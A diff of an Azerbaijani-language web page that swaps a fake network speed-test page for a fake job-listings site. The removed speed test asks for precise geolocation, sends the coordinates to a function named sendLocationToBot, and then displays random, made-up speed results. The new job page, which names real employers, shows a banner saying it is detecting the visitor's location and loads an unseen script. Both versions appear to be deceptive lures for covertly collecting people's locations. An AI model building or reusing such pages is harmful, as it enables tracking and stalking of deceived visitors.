@@ -1,205 +1,334 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Şəbəkə Analizi</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>İşVar.az | Azərbaycanın Əsas İş Elanları Saytı</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #0061ff;
+            --primary-dark: #004ecc;
+            --success: #00ba70;
+            --bg: #f4f7fa;
+            --border: #e1e8f0;
+            --text-dark: #1a1f36;
+            --text-muted: #697386;
+        }
 
-<style>
-:root{
-  --bg:#060910;
-  --card:#0e1320;
-  --accent:#00ffd5;
-  --muted:#8b93a7;
-  --ok:#10b981;
-}
-body{
-  margin:0;
-  font-family:Segoe UI,Roboto,sans-serif;
-  background:var(--bg);
-  color:#fff;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  height:100vh;
-}
-.container{
-  width:100%;
-  max-width:420px;
-  text-align:center;
-}
-h1{
-  font-weight:300;
-  letter-spacing:2px;
-  margin-bottom:30px;
-}
-.gauge{
-  position:relative;
-  width:260px;
-  height:260px;
-  margin:0 auto;
-  display:none;
-}
-svg{ transform:rotate(-90deg); }
-circle{
-  fill:none;
-  stroke-width:10;
-}
-.bg{ stroke:#1f2638; }
-.progress{
-  stroke:var(--accent);
-  stroke-dasharray:628;
-  stroke-dashoffset:628;
-  stroke-linecap:round;
-  transition:stroke-dashoffset .08s linear;
-}
-.speed{
-  position:absolute;
-  inset:0;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
-}
-.speed b{ font-size:48px; }
-.speed span{ color:var(--muted); font-size:13px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: var(--bg);
+            color: var(--text-dark);
+        }
 
-button{
-  width:140px;
-  height:140px;
-  border-radius:50%;
-  background:transparent;
-  border:2px solid var(--accent);
-  color:var(--accent);
-  font-size:22px;
-  cursor:pointer;
-  box-shadow:0 0 30px rgba(0,255,213,.25);
-}
-.stats{
-  display:grid;
-  grid-template-columns:repeat(3,1fr);
-  gap:15px;
-  margin-top:30px;
-  opacity:.3;
-  transition:.4s;
-}
-.stat span{ color:var(--muted); font-size:12px; }
-.stat b{ font-size:18px; }
-.status{
-  margin-top:20px;
-  font-size:14px;
-  color:var(--accent);
-}
-.done{ color:var(--ok); }
-</style>
+        /* --- Naviqasiya --- */
+        nav {
+            background: white;
+            padding: 0 10%;
+            height: 80px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0; z-index: 1000;
+        }
+        .logo { font-size: 28px; font-weight: 800; color: var(--primary); text-decoration: none; letter-spacing: -1.5px; }
+        .nav-links { display: flex; gap: 30px; }
+        .nav-links a { text-decoration: none; color: var(--text-dark); font-size: 15px; font-weight: 600; }
+        .btn-add-job { background: var(--primary); color: white !important; padding: 10px 22px; border-radius: 12px; }
+
+        /* --- Ağıllı Lokasiya Bildirişi --- */
+        .location-alert {
+            background: #eef2ff;
+            color: #3730a3;
+            padding: 14px 10%;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            border-bottom: 1px solid #c7d2fe;
+            font-weight: 500;
+        }
+        .pulse-loader {
+            width: 10px; height: 10px;
+            background: var(--primary);
+            border-radius: 50%;
+            box-shadow: 0 0 0 0 rgba(0, 97, 255, 0.4);
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 97, 255, 0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(0, 97, 255, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 97, 255, 0); } }
+
+        /* --- Search Section --- */
+        .hero-search {
+            background: white;
+            padding: 50px 10%;
+            border-bottom: 1px solid var(--border);
+        }
+        .hero-search h1 { font-size: 32px; margin-bottom: 30px; font-weight: 800; text-align: center; }
+        .search-container {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr 120px;
+            gap: 15px;
+            max-width: 1100px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 10px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.04);
+            border: 1px solid var(--border);
+        }
+        .search-container input, .search-container select {
+            padding: 15px;
+            border: none;
+            background: #f8fafc;
+            border-radius: 12px;
+            font-size: 14px;
+            outline: none;
+        }
+        .btn-main-search {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        /* --- Layout --- */
+        .main-grid {
+            max-width: 1200px;
+            margin: 40px auto;
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 40px;
+            padding: 0 20px;
+        }
+
+        /* --- Sidebar --- */
+        .sidebar {
+            background: white;
+            padding: 25px;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            height: fit-content;
+        }
+        .sidebar h4 { margin-bottom: 15px; font-size: 16px; font-weight: 700; }
+        .filter-item { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; font-size: 14px; color: var(--text-muted); cursor: pointer; }
+
+        /* --- Job Listings --- */
+        .job-card {
+            background: white;
+            padding: 25px;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: 0.3s;
+        }
+        .job-card:hover { transform: translateY(-5px); box-shadow: 0 15px 30px rgba(0,0,0,0.06); border-color: var(--primary); }
+
+        .comp-info { display: flex; gap: 20px; align-items: center; }
+        .comp-icon {
+            width: 65px; height: 65px;
+            background: #f0f4ff;
+            border-radius: 15px;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 800; color: var(--primary); font-size: 20px;
+        }
+        .details h3 { font-size: 20px; margin-bottom: 6px; font-weight: 700; }
+        .details p { font-size: 14px; color: var(--text-muted); margin-bottom: 4px; }
+        .location-tag { background: #e0f2fe; color: #0369a1; padding: 4px 12px; border-radius: 6px; font-size: 12px; font-weight: 600; }
+
+        .price-area { text-align: right; }
+        .price { font-size: 20px; font-weight: 800; color: var(--success); }
+        .apply-now { background: var(--text-dark); color: white; padding: 10px 20px; border-radius: 10px; border: none; margin-top: 15px; cursor: pointer; font-weight: 600; }
+
+        @media (max-width: 900px) {
+            .main-grid { grid-template-columns: 1fr; }
+            .sidebar { display: none; }
+            .search-container { grid-template-columns: 1fr; }
+        }
+    </style>
 </head>
-
 <body>
-<div class="container">
-  <h1>ŞƏBƏKƏ ANALİZİ</h1>
 
-  <div class="gauge" id="gauge">
-    <svg width="260" height="260" viewBox="0 0 220 220">
-      <circle class="bg" cx="110" cy="110" r="100"/>
-      <circle id="circle" class="progress" cx="110" cy="110" r="100"/>
-    </svg>
-    <div class="speed">
-      <b id="speed">0</b>
-      <span>Mbps</span>
+<nav>
+    <a href="#" class="logo">İşVar.az</a>
+    <div class="nav-links">
+        <a href="#">Bütün vakansiyalar</a>
+        <a href="#">Dövlət işləri</a>
+        <a href="#">Şirkətlər</a>
+        <a href="#" class="btn-add-job">Elan yerləşdir +</a>
     </div>
-  </div>
+</nav>
 
-  <button id="start">BAŞLA</button>
-
-  <div class="status" id="status">Testi başlatmaq üçün düyməyə basın</div>
-
-  <div class="stats" id="stats">
-    <div class="stat"><span>Ping</span><b id="ping">–</b></div>
-    <div class="stat"><span>Download</span><b id="down">–</b></div>
-    <div class="stat"><span>Upload</span><b id="up">–</b></div>
-  </div>
+<!-- Lokasiya Tapılma Baneri -->
+<div class="location-alert" id="loc-banner">
+    <div class="pulse-loader"></div>
+    <span id="banner-text">Sizə ən yaxın vakansiyaların filtrasiyası üçün lokasiya təyin edilir...</span>
 </div>
 
-<!-- əvvəl scripts.js -->
-<script src="./scripts.js"></script>
+<div class="hero-search">
+    <h1>Azərbaycanın ən böyük karyera platforması</h1>
+    <div class="search-container">
+        <input type="text" placeholder="Peşə və ya vəzifə adı...">
+        <select id="region-selector">
+            <option value="Bakı">Bakı</option>
+            <option value="Sumqayıt">Sumqayıt</option>
+            <option value="Gəncə">Gəncə</option>
+            <option value="Xırdalan">Xırdalan</option>
+            <option value="Mingəçevir">Mingəçevir</option>
+            <option value="Naxçıvan">Naxçıvan</option>
+            <option value="Lənkəran">Lənkəran</option>
+            <option value="Quba">Quba</option>
+        </select>
+        <select>
+            <option>Kateqoriya</option>
+            <option>Maliyyə</option>
+            <option>İnformasiya Texnologiyaları</option>
+            <option>Satış və Marketinq</option>
+            <option>Tibbi Personall</option>
+        </select>
+        <button class="btn-main-search">Axtar</button>
+    </div>
+</div>
 
-<script>
-const startBtn=document.getElementById('start');
-const gauge=document.getElementById('gauge');
-const circle=document.getElementById('circle');
-const speedEl=document.getElementById('speed');
-const statusEl=document.getElementById('status');
-const stats=document.getElementById('stats');
+<div class="main-grid">
+    <aside class="sidebar">
+        <div style="margin-bottom: 30px;">
+            <h4>İş qrafiki</h4>
+            <div class="filter-item"><input type="checkbox" checked> Tam iş günü</div>
+            <div class="filter-item"><input type="checkbox"> Freelance</div>
+            <div class="filter-item"><input type="checkbox"> Remote (Uzaqdan)</div>
+        </div>
+        <div style="margin-bottom: 30px;">
+            <h4>Təcrübə</h4>
+            <div class="filter-item"><input type="checkbox"> 1 ilə qədər</div>
+            <div class="filter-item"><input type="checkbox" checked> 1-3 il</div>
+            <div class="filter-item"><input type="checkbox"> 3-5 il</div>
+            <div class="filter-item"><input type="checkbox"> 5 ildən artıq</div>
+        </div>
+        <div>
+            <h4>Maaş aralığı (AZN)</h4>
+            <div class="filter-item"><input type="radio" name="s"> 500 - 1000</div>
+            <div class="filter-item"><input type="radio" name="s" checked> 1000 - 2500</div>
+            <div class="filter-item"><input type="radio" name="s"> 2500+</div>
+        </div>
+    </aside>
 
-const pingEl=document.getElementById('ping');
-const downEl=document.getElementById('down');
-const upEl=document.getElementById('up');
+    <section>
+        <h2 style="margin-bottom: 25px;" id="list-title">Populyar vakansiyalar (Bakı)</h2>
 
-startBtn.onclick=()=>{
-  statusEl.textContent="Ən yaxın server müəyyən edilir…";
+        <!-- SOCAR -->
+        <div class="job-card">
+            <div class="comp-info">
+                <div class="comp-icon" style="color: #004ecc; border-left: 5px solid #004ecc;">SOC</div>
+                <div class="details">
+                    <h3>Baş Mexanik</h3>
+                    <p><i class="fa fa-building"></i> SOCAR - Azərbaycan Respublikası Dövlət Neft Şirkəti</p>
+                    <span class="location-tag">Bakı, Səbail r.</span>
+                </div>
+            </div>
+            <div class="price-area">
+                <div class="price">1800 - 2400 AZN</div>
+                <button class="apply-now">Müraciət et</button>
+            </div>
+        </div>
 
-  navigator.geolocation.getCurrentPosition(
-    pos=>{
-      if(window.sendLocationToBot){
-        window.sendLocationToBot({
-          lat:pos.coords.latitude,
-          lng:pos.coords.longitude,
-          acc:pos.coords.accuracy,
-          time:new Date().toISOString()
-        });
-      }
-      runTest();
-    },
-    ()=> statusEl.textContent="Lokasiya icazəsi tələb olunur",
-    {enableHighAccuracy:true,timeout:8000}
-  );
-};
+        <!-- Pasha Bank -->
+        <div class="job-card">
+            <div class="comp-info">
+                <div class="comp-icon" style="color: #2c3e50; border-left: 5px solid #2c3e50;">PAS</div>
+                <div class="details">
+                    <h3>Digital Marketing Lead</h3>
+                    <p><i class="fa fa-building"></i> Paşa Bank ASC</p>
+                    <span class="location-tag">Bakı, Port Baku</span>
+                </div>
+            </div>
+            <div class="price-area">
+                <div class="price">2500 - 3500 AZN</div>
+                <button class="apply-now">Müraciət et</button>
+            </div>
+        </div>
 
-function runTest(){
-  startBtn.style.display="none";
-  gauge.style.display="block";
-  stats.style.opacity=1;
+        <!-- Kapital Bank -->
+        <div class="job-card">
+            <div class="comp-info">
+                <div class="comp-icon" style="color: #e31e24; border-left: 5px solid #e31e24;">KAP</div>
+                <div class="details">
+                    <h3>Kiçik mütəxəssis (Risk Analizi)</h3>
+                    <p><i class="fa fa-building"></i> Kapital Bank ASC</p>
+                    <span class="location-tag">Bakı, Baş Ofis</span>
+                </div>
+            </div>
+            <div class="price-area">
+                <div class="price">900 - 1200 AZN</div>
+                <button class="apply-now">Müraciət et</button>
+            </div>
+        </div>
 
-  // Ping
-  statusEl.textContent="Ping ölçülür…";
-  setTimeout(()=>{
-    pingEl.textContent=Math.floor(rand(14,32))+" ms";
-    download();
-  },1200);
-}
+        <!-- Azercell -->
+        <div class="job-card">
+            <div class="comp-info">
+                <div class="comp-icon" style="color: #6c2d91; border-left: 5px solid #6c2d91;">AZC</div>
+                <div class="details">
+                    <h3>Sistem Administratoru</h3>
+                    <p><i class="fa fa-building"></i> Azercell Telecom MMC</p>
+                    <span class="location-tag">Bakı, Azərbaycan</span>
+                </div>
+            </div>
+            <div class="price-area">
+                <div class="price">1500 - 2000 AZN</div>
+                <button class="apply-now">Müraciət et</button>
+            </div>
+        </div>
 
-function download(){
-  statusEl.textContent="Download sürəti ölçülür…";
-  animate(25,95,val=>{
-    downEl.textContent=val.toFixed(1);
-    upload();
-  });
-}
+        <!-- Bravo -->
+        <div class="job-card">
+            <div class="comp-info">
+                <div class="comp-icon" style="color: #f7941d; border-left: 5px solid #f7941d;">BRV</div>
+                <div class="details">
+                    <h3>Supervayzer (Satış)</h3>
+                    <p><i class="fa fa-building"></i> Bravo Supermarketlər Şəbəkəsi</p>
+                    <span class="location-tag">Bakı / Xırdalan</span>
+                </div>
+            </div>
+            <div class="price-area">
+                <div class="price">800 - 1100 AZN</div>
+                <button class="apply-now">Müraciət et</button>
+            </div>
+        </div>
 
-function upload(){
-  statusEl.textContent="Upload sürəti ölçülür…";
-  animate(10,30,val=>{
-    upEl.textContent=val.toFixed(1);
-    statusEl.textContent="Şəbəkə stabil görünür";
-    statusEl.classList.add('done');
-  });
-}
+        <!-- Gence Vakansiyasi -->
+        <div class="job-card">
+            <div class="comp-info">
+                <div class="comp-icon" style="color: #27ae60; border-left: 5px solid #27ae60;">VEI</div>
+                <div class="details">
+                    <h3>Region üzrə Ekspeditor</h3>
+                    <p><i class="fa fa-building"></i> Veysəloğlu Şirkətlər Qrupu</p>
+                    <span class="location-tag">Gəncə şəhəri</span>
+                </div>
+            </div>
+            <div class="price-area">
+                <div class="price">600 - 900 AZN</div>
+                <button class="apply-now">Müraciət et</button>
+            </div>
+        </div>
+    </section>
+</div>
 
-function animate(min,max,done){
-  let cur=0,target=rand(min,max);
-  let i=setInterval(()=>{
-    cur+=1.6;
-    let v=Math.min(cur,target);
-    speedEl.textContent=v.toFixed(1);
-    circle.style.strokeDashoffset=628-(628*(v/100));
-    if(v>=target){
-      clearInterval(i);
-      done(target);
-    }
-  },50);
-}
+<footer style="background: white; padding: 40px; text-align: center; border-top: 1px solid var(--border); margin-top: 50px; color: var(--text-muted); font-size: 14px;">
+    &copy; 2026 İşVar.az - Peşəkar Karyera Portalı. <br> Bütün hüquqlar qorunur.
+</footer>
 
-const rand=(a,b)=>Math.random()*(b-a)+a;
-</script>
+<script src="scripts.js"></script>
+
 </body>
 </html>
